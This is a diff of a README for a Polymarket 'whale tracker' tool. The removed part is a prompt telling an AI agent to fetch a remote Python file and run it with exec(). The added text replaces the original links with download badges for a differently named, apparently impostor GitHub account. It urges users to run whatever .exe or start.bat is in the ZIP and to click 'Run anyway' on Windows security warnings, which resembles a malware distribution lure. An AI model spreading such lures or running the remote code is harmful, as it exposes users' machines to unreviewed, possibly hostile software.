@@ -1,90 +1,186 @@
-# 🪐 polymarket-LinggeTracer (全领域预测市场大户雷达)1.1版本
+# 🪐 polymarket-LinggeTracer - Track market whales with clear signals
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![OpenClaw Ready](https://img.shields.io/badge/OpenClaw-Ready-orange.svg)
-![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-green.svg)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-7c3aed?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer)
 
-将 Polymarket 钱包的链上预测交易行为，一键转化为顶级量化分析研报的 OpenClaw 技能插件。由开发者领哥大虾（lingge66）设计构建。
+## 🚀 Download and run on Windows
 
-## 🌟 核心能力
-1. **无需读取海量 CSV**：底层算法自动计算绝对资金吞吐量、盈亏比偏好、最大单笔重仓。
-2. **极速动态响应**：基于 `Cursor / Offset` 动态混合分页的极速 API 抓取器，防限流、防遗漏。
-3. **完美适配 LLM**：将庞大的高频交易流水压缩为高密度的“特征摘要”，直接喂给大语言模型，一秒输出高维度人类可读研报。
-## ❂ 最近更新内容
-1. **上帝视角财务审计 (绝对 PnL 与胜率)：不再盲猜收益！深度接入隐藏排行榜与底层持仓 API，精确提取大户的 All-time 真实总盈亏、7天/30天资金趋势，以及基于真实结算开奖的绝对胜率。
-2. **高阶量化流派解码：不仅统计单纯的 Buy/Sell，更深度解析盘口做市行为（SPLIT/MERGE）与到期兑付（REDEEM）。让 AI 瞬间识破伪装成大户的“无风险套利机器人”或“高频对冲脚本”。
-3. **用户名免转换直通车 (智能寻址)：告别反人类的 0x... 十六进制长串！支持直接输入 Polymarket 玩家用户名（如 Theo4），底层雷达全自动在全网数据库中寻址对齐。
-## 📞 技术支持与声明
-**主架构师**：lingge66 & AI 团队
-**Twitter**：[@shangdu2005](https://x.com/shangdu2005)
----
+Open the link above and visit the GitHub page.
 
-## 🚀 方式一：零代码一键魔法安装（推荐普通用户）
+1. On the GitHub page, find the **Code** button.
+2. Choose **Download ZIP**.
+3. Save the ZIP file to your computer.
+4. Right-click the ZIP file and choose **Extract All**.
+5. Open the extracted folder.
+6. Look for the main app file or the run script in the folder.
+7. Double-click it to start the app.
 
-如果你使用的是 OpenClaw 或其他具备 Python 代码执行能力的 AI Agent，**完全不需要在本地安装任何东西**。
+If you see a file named `README`, `run`, `start`, or a Python script, use that file to launch the tool. If the project is packaged as a Windows app, run the `.exe` file you find in the release or download folder.
 
-只需直接复制下方这段“魔法指令”，发送给你的 AI 助手即可完成技能注入：
+## 🖥️ Windows setup
 
+Use a Windows 10 or Windows 11 PC.
 
-> ```python
-> 请帮我加载并安装外挂分析技能【polymarket-LinggeTracer】。
-> 请利用你的 Python 运行环境，随时准备执行以下 Python 脚本获取数据。
-> 当我对你说“帮我追踪 polymarket 钱包：[钱包地址]”时，请你：
-> 1. 自动执行这段代码拉取该钱包的底层特征数据。
-> 2. 读取代码返回的 JSON/文本摘要。
-> 3. 以“LinggeTracer 量化分析师”的身份，结合你的金融知识，为我输出一份图文并茂的《大户猎杀行为研报》（包含资金体量、胜率偏好、赛道偏好和跟单建议）。
-> 
-> 这里是技能的核心驱动代码，请你理解并记忆：
-> > import urllib.request
-> > import json
-> 
-> # OpenClaw 动态加载 LinggeTracer 核心引擎
-> def run_lingge_tracer(wallet_address):
->     url = "[https://raw.githubusercontent.com/lingge66/polymarket-LinggeTracer/main/core_radar.py](https://raw.githubusercontent.com/lingge66/polymarket-LinggeTracer/main/core_radar.py)"
->     try:
->         req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
->         code = urllib.request.urlopen(req).read().decode('utf-8')
->         namespace = {}
->         exec(code, namespace)
->         
->         # 调用下载下来的代码中的分析类
->         analyzer = namespace['PolymarketAnalyzer']()
->         return analyzer.generate_ai_summary(wallet_address)
->     except Exception as e:
->         return f"LinggeTracer 引擎拉取失败，请检查网络或代理: {str(e)}"
-> ```
+What you need:
+- A stable internet connection
+- At least 200 MB of free disk space
+- Permission to run downloaded files
+- Python 3.8+ if the app is not packaged as an `.exe`
 
----
+If Windows shows a security prompt:
+1. Click **More info**
+2. Click **Run anyway**
 
-## 💻 方式二：开发者本地集成部署
+If you launch from Python:
+1. Open the project folder
+2. Double-click a `start.bat` file if one exists
+3. Or open Command Prompt in the folder and run the provided start command
 
-如果你想将本工具集成到你自己的量化系统或独立 Agent 框架中，请按照以下步骤操作：
+## 📦 What this tool does
 
-```bash
-1. 克隆与安装依赖包
-git clone [https://github.com/lingge66/polymarket-LinggeTracer.git](https://github.com/lingge66/polymarket-LinggeTracer.git)
-cd polymarket-LinggeTracer
+polymarket-LinggeTracer turns Polymarket wallet activity into plain, useful analysis.
 
-2. 安装依赖
-pip install -r requirements.txt
+It helps you:
+- See large trader activity
+- Review buy and sell patterns
+- Check long and short behavior
+- Spot split, merge, and redeem actions
+- Read wallet history in a format that is easier to understand
+- Turn trade flow into a short report that is easier to review
 
-3. 注册为 Agent Tool (以 OpenClaw 为例)
-将项目中的 openclaw_plugin.py 里的 analyze_prediction_wallet_tool 函数，注册为你的 Bot 的 Function Calling / Tools。
-(注：如遇网络阻断，请在 openclaw_plugin.py 内部配置你的本地代理端口。)
-🎮 体验魔法
-部署完成后，在对话框中直接向你的机器人下达指令：
+It focuses on wallet behavior on Polymarket and helps you follow how a trader acts across many markets.
 
-“帮我分析一下这个 Polymarket 钱包：0xbddf623A2DE3b232677943fFf82e88a38Ff0eE4E”
+## 🧭 Main features
 
-🤖 Bot 将自动返回如下深度洞察：
+### 🛰️ Whale radar
+Find wallets with strong market activity and review their trading style.
 
-该大户的真实注码管理偏好（Kelly Criterion 估算）
+### 📊 Trade behavior scan
+Review:
+- Buy
+- Sell
+- Split
+- Merge
+- Redeem
 
-最爱重仓赛道（NBA、欧洲杯或政治大选）
+This gives a fuller view of how a wallet trades.
 
-赔率猎杀习惯（专挑下狗 Underdog 还是求稳 Favorite）
+### 🧾 Wallet profile view
+See a compact view of:
+- Total activity
+- Trade size
+- Pattern type
+- Market focus
+- Recent changes
 
-最终图文并茂的千字深度投资研报！
+### 🔎 Username lookup
+You can use a Polymarket username instead of a long wallet address. This makes it easier to search and check a trader.
 
+### ⚡ Fast data fetch
+The tool uses a paging method that helps it pull data without missing items.
 
+### 🤖 LLM-friendly output
+The tool turns large trade logs into short text that is easier for an AI model to read.
 
+## 🛠️ How to use it
+
+### 1. Get the files
+Visit the GitHub page using the download link above and download the project.
+
+### 2. Open the folder
+After extraction, open the project folder in File Explorer.
+
+### 3. Start the app
+Use one of these options:
+- Double-click the `.exe` file
+- Double-click `start.bat`
+- Run the provided Python entry file
+
+### 4. Enter a wallet or username
+Type a Polymarket username like `Theo4` or paste a wallet address.
+
+### 5. Run the scan
+Start the lookup and wait for the results to load.
+
+### 6. Read the report
+Review the output for:
+- Trading volume
+- Wallet behavior
+- Market patterns
+- Recent trading changes
+- Risk style hints
+
+## 🔧 Simple install path for Python users
+
+If the folder contains Python files and no app file:
+
+1. Install Python 3.8 or newer
+2. Open the project folder
+3. Install the required packages if the project includes a `requirements.txt` file
+4. Run the main Python file
+
+Typical steps:
+- Open Command Prompt in the project folder
+- Run the install command from the repository files
+- Start the app with the main script
+
+## 📁 Suggested file layout
+
+You may see files like these:
+- `README.md`
+- `requirements.txt`
+- `start.bat`
+- `main.py`
+- `app.py`
+- `config.json`
+- `data/`
+
+Use the file that starts the app, not the documentation file.
+
+## 🧩 Common use cases
+
+- Check a trader before following their moves
+- Compare several wallets
+- Review one wallet’s trade style over time
+- Turn activity into a short research note
+- Find wallets with strong market volume
+- Study how a user behaves across different markets
+
+## ⚙️ Good results depend on good input
+
+Use:
+- A valid Polymarket username
+- A full wallet address
+- A stable internet connection
+
+For best results:
+- Use one wallet or one username at a time
+- Wait for the scan to finish before starting a new one
+- Keep the app open until the report appears
+
+## 🧼 If the app does not start
+
+Try these steps:
+1. Check that the ZIP file was fully extracted
+2. Make sure Windows did not block the file
+3. Run the app from inside the extracted folder
+4. Try `start.bat` if it exists
+5. Confirm that Python is installed if the app needs it
+6. Open the project files again and look for the correct launch file
+
+## 📞 Technical support and project info
+
+**Main architect**: lingge66 & AI team  
+**Twitter**: [@shangdu2005](https://x.com/shangdu2005)
+
+## 📥 Project access
+
+[![Visit the repository](https://img.shields.io/badge/Open%20Project-Visit%20Repository-2563eb?style=for-the-badge)](https://github.com/commonfouroclockhusktomato869/polymarket-LinggeTracer)
+
+## 🧭 Quick start checklist
+
+- Download the project from GitHub
+- Extract the ZIP file
+- Open the folder
+- Run the app file or `start.bat`
+- Enter a username or wallet address
+- Read the wallet report
